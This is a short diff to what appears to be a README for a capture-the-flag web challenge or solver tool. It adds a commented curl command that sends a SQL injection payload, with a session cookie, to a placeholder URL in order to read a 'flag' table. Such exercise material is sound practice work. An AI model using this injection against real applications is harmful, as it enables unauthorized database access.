@@ -10,3 +10,6 @@ Step 2: Enter URL and Your session cookie
 ![2](https://github.com/user-attachments/assets/77f7c400-81c2-47f0-bce1-7187a538ce8e)
 
 
+
+#curl -X POST http://URL.com / -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=YOUR_SESSION_COOKIE" --data "note=AppSec' || (select * from flag)) --"
+
